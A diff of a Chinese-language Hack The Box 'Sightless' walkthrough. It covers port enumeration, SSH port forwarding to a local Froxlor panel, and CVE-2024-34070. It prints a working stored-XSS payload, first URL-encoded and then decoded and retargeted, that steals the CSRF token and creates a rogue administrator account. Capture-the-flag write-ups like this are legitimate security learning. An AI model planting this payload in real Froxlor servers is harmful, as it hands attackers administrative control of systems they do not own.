@@ -144,7 +144,8 @@ uid=1000(michael) gid=1000(michael) groups=1000(michael)
 michael@sightless:~$ cat user.txt
 ```
 #### 然后，可以继续使用netstat检查系统上存在的开放端口命令
-```michael@sightless:~$ netstat -lputu
+```
+michael@sightless:~$ netstat -lputu
 (Not all processes could be identified, non-owned process info
  will not be shown, you would have to be root to see it all.)
 Active Internet connections (only servers)
@@ -163,30 +164,57 @@ tcp6       0      0 [::]:ftp                [::]:*                  LISTEN      
 tcp6       0      0 [::]:ssh                [::]:*                  LISTEN      -                   
 udp        0      0 localhost:domain        0.0.0.0:*                           -                   
 udp        0      0 0.0.0.0:bootpc          0.0.0.0:*
-```
-#### 这里我们看到端口http是打开的。我们可以使用SSH对其进行端口转发
-#### 鄙人输入了8282:127.0.0.1:8080 ,在使用burpsuite的时候，自找苦吃
-```
-[★]$ ssh michael@sightless.htb -L 8081:127.0.0.1:8080  
-The authenticity of host 'sightless.htb (10.129.243.28)' can't be established.
-ED25519 key fingerprint is SHA256:L+MjNuOUpEDeXYX6Ucy5RCzbINIjBx2qhJQKjYrExig.
-This host key is known by the following other names/addresses:
-    ~/.ssh/known_hosts:1: [hashed name]
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added 'sightless.htb' (ED25519) to the list of known hosts.
-michael@sightless.htb's password: 
-Last login: Wed Sep  3 14:31:16 2025 from 10.10.14.71
+
+michael@sightless:~$ netstat -lputn
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:34761         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:41447         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:59967         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::21                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
 michael@sightless:~$
 ```
-#### 神奇，竟然还有个输入端口，一般直接去浏览器了127.0.0.1:8282
+#### 这里我们看到端口http是打开的。我们可以使用SSH对其进行端口转发
+```
+[★]$ ssh michael@sightless.htb -L 10.10.14.80:8083:127.0.0.1:8080  
+
+michael@sightless.htb's password: 
+
+michael@sightless:~$
+```
+#### 神奇，竟然还有个输入端口
 图
 #### 在访问端口时，我们会看到一个Froxlor登录页面，这是一个轻量级服务器管理软件
 #### https://nvd.nist.gov/vuln/detail/CVE-2024-34070
+### 在拦截burpsuite流量时，Froxlor登录的用户和密码随意
+Froxlor 是一款开源服务器管理软件。在 ​​2.1.9 之前的版本中，Froxlor 应用程序的“登录失败尝试日志记录”功能中发现了一个存储盲跨站脚本 (XSS) 漏洞。未经身份验证的用户可以在登录尝试时向 loginname 参数注入恶意脚本，这些脚本会在管理员查看系统日志时执行。
+
+#### 鄙人输入了8282:127.0.0.1:8080 ,在使用burpsuite的时候，自找苦吃
+#### 梅开二度，即使8081:127.0.0.1:8080；在 Burp 里设置的 Redirect 127.0.0.1:8081 只有在浏览器流量进入 Burp 时才会生效，现在流量根本没进入 Burp → Redirect 根本没用
+图
+#### 使用本机地址+端口在burpuite截取转发端口的流量，即8081:127.0.0.1:8080换成10.10.14.80:8083:127.0.0.1:8080,burpsuite也不要设置Redirect端口了。
+图
+
 
 #### https://github.com/advisories/GHSA-x525-54hf-xr53点击payload.txt是如下的内容：
 ```
 admin{{$emit.constructor`function+b(){var+metaTag%3ddocument.querySelector('meta[name%3d"csrf-token"]')%3bvar+csrfToken%3dmetaTag.getAttribute('content')%3bvar+xhr%3dnew+XMLHttpRequest()%3bvar+url%3d"https%3a//demo.froxlor.org/admin_admins.php"%3bvar+params%3d"new_loginname%3dabcd%26admin_password%3dAbcd%40%401234%26admin_password_suggestion%3dmgphdKecOu%26def_language%3den%26api_allowed%3d0%26api_allowed%3d1%26name%3dAbcd%26email%3dyldrmtest%40gmail.com%26custom_notes%3d%26custom_notes_show%3d0%26ipaddress%3d-1%26change_serversettings%3d0%26change_serversettings%3d1%26customers%3d0%26customers_ul%3d1%26customers_see_all%3d0%26customers_see_all%3d1%26domains%3d0%26domains_ul%3d1%26caneditphpsettings%3d0%26caneditphpsettings%3d1%26diskspace%3d0%26diskspace_ul%3d1%26traffic%3d0%26traffic_ul%3d1%26subdomains%3d0%26subdomains_ul%3d1%26emails%3d0%26emails_ul%3d1%26email_accounts%3d0%26email_accounts_ul%3d1%26email_forwarders%3d0%26email_forwarders_ul%3d1%26ftps%3d0%26ftps_ul%3d1%26mysqls%3d0%26mysqls_ul%3d1%26csrf_token%3d"%2bcsrfToken%2b"%26page%3dadmins%26action%3dadd%26send%3dsend"%3bxhr.open("POST",url,true)%3bxhr.setRequestHeader("Content-type","application/x-www-form-urlencoded")%3balert("Your+Froxlor+Application+has+been+completely+Hacked")%3bxhr.send(params)}%3ba%3db()`()}}
 ```
-
-
+#### https://gchq.github.io/CyberChef/
+#### 修改htttps://admin.sightless.htb:8080
+```
+admin{{$emit.constructor`function b(){var metaTag=document.querySelector('meta[name="csrf-token"]');var csrfToken=metaTag.getAttribute('content');var xhr=new XMLHttpRequest();var url="https://admin.sightless.htb:8080/admin_admins.php";var params="new_loginname=abcd&admin_password=Abcd@@1234&admin_password_suggestion=mgphdKecOu&def_language=en&api_allowed=0&api_allowed=1&name=Abcd&email=yldrmtest@gmail.com&custom_notes=&custom_notes_show=0&ipaddress=-1&change_serversettings=0&change_serversettings=1&customers=0&customers_ul=1&customers_see_all=0&customers_see_all=1&domains=0&domains_ul=1&caneditphpsettings=0&caneditphpsettings=1&diskspace=0&diskspace_ul=1&traffic=0&traffic_ul=1&subdomains=0&subdomains_ul=1&emails=0&emails_ul=1&email_accounts=0&email_accounts_ul=1&email_forwarders=0&email_forwarders_ul=1&ftps=0&ftps_ul=1&mysqls=0&mysqls_ul=1&csrf_token="+csrfToken+"&page=admins&action=add&send=send";xhr.open("POST",url,true);xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");alert("Your Froxlor Application has been completely Hacked");xhr.send(params)};a=b()`()}}
+```
 
